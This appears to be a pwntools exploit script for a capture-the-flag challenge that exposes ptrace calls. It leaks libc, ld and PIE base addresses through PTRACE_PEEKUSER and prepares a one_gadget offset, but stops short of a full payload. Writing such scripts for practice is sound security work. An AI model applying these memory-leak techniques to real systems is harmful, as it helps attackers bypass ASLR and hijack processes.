#!/usr/bin/env python3

from pwn import *

exe = ELF("challenge_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe


PTRACE_TRACEME = 0x0
PTRACE_PEEKTEXT = 0x1
PTRACE_PEEKDATA = 0x2
PTRACE_PEEKUSER = 0x3
PTRACE_POKETEXT = 0x4
PTRACE_POKEDATA = 0x5
PTRACE_POKEUSER = 0x6
PTRACE_CONT = 0x7
PTRACE_KILL = 0x8
PTRACE_SINGLESTEP = 0x9
PTRACE_GETREGS = 0xc
PTRACE_SETREGS = 0xd
PTRACE_GETFPREGS = 0xe
PTRACE_SETFPREGS = 0xf
PTRACE_ATTACH = 0x10
PTRACE_DETACH = 0x11
PTRACE_GETFPXREGS = 0x12
PTRACE_SETFPXREGS = 0x13
PTRACE_SYSCALL = 0x18
PTRACE_GET_THREAD_AREA = 0x19
PTRACE_SET_THREAD_AREA = 0x1a
PTRACE_ARCH_PRCTL = 0x1e
PTRACE_SYSEMU = 0x1f
PTRACE_SYSEMU_SINGLESTEP = 0x20
PTRACE_SINGLEBLOCK = 0x21
PTRACE_SETOPTIONS = 0x4200
PTRACE_GETEVENTMSG = 0x4201
PTRACE_GETSIGINFO = 0x4202
PTRACE_SETSIGINFO = 0x4203
PTRACE_GETREGSET = 0x4204
PTRACE_SETREGSET = 0x4205
PTRACE_SEIZE = 0x4206
PTRACE_INTERRUPT = 0x4207
PTRACE_LISTEN = 0x4208
PTRACE_PEEKSIGINFO = 0x4209
PTRACE_GETSIGMASK = 0x420a
PTRACE_SETSIGMASK = 0x420b
PTRACE_SECCOMP_GET_FILTER = 0x420c
PTRACE_SECCOMP_GET_METADATA = 0x420d
PTRACE_GET_SYSCALL_INFO = 0x420e

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

r = conn()

def send_ptrace_req(ptrace_call, arg1, arg2):
    r.sendlineafter('?', f"{ptrace_call}")
    r.sendlineafter('?', f"{arg1}")
    r.sendline(f"{arg2}")
    r.recvuntil("ptrace returned")
    ret = r.recvline().strip()
    r.sendlineafter("(0/1)?", "1")
    return ret


def main():
    one_gadget = 0xebcf5

    libc_leak = send_ptrace_req(3,0,8);
    libc_leak = int(libc_leak.decode(),16)
    print(hex(libc_leak))
    libc_base = libc_leak - 0x29B040
    log.info(f"libc base: {hex(libc_base)}")
    # good luck pwning :)
    libc.address = libc_base
    writeable_offset_libc = 0x219000

    ld_leak = int(send_ptrace_req(3,0,0).decode(),16)
    ld_base = ld_leak - 0x3A040
    log.info(f"ld leak : {hex(ld_base)}")

    pie_leak = send_ptrace_req(3, 8, 0)
    pie_leak = int(pie_leak.decode(),16)
    pie_base = pie_leak + 0x0055727d819000 - 0x55727d81cd68
    log.info(f"pie leak : {hex(pie_base)}")

    print(send_ptrace_req(PTRACE_PEEKTEXT,pie_base+0x3fa0,0))
    

    r.interactive()


if __name__ == "__main__":
    main()
